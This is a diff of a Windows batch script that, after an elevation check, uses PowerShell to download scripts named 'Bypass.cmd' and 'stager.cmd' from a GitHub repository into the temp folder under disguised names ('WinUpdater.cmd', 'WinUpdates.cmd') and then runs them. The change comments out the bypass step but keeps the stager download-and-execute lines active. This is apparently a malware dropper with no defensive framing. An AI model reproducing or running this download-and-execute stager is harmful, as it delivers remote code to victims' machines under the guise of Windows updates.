@@ -28,16 +28,16 @@ if '%errorlevel%' NEQ '0' (
 :: Configuration
 set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/Bypass.cmd"
 set "PS2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/stager.cmd"
-set "PS1_FILE=%temp%\WinUpdater.cmd"
+rem set "PS1_FILE=%temp%\WinUpdater.cmd"
 set "PS2_FILE=%temp%\WinUpdates.cmd"
 
 :: Download files
-powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
+rem powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
 powershell -Command "Invoke-WebRequest -Uri '%PS2_URL%' -OutFile '%PS2_FILE%'"
 
 :: Execute scripts
-if exist "%PS1_FILE%" call "%PS1_FILE%"
-timeout /t 5 /nobreak >nul
+rem if exist "%PS1_FILE%" call "%PS1_FILE%"
+rem timeout /t 5 /nobreak >nul
 if exist "%PS2_FILE%" call "%PS2_FILE%"
 
 endlocal
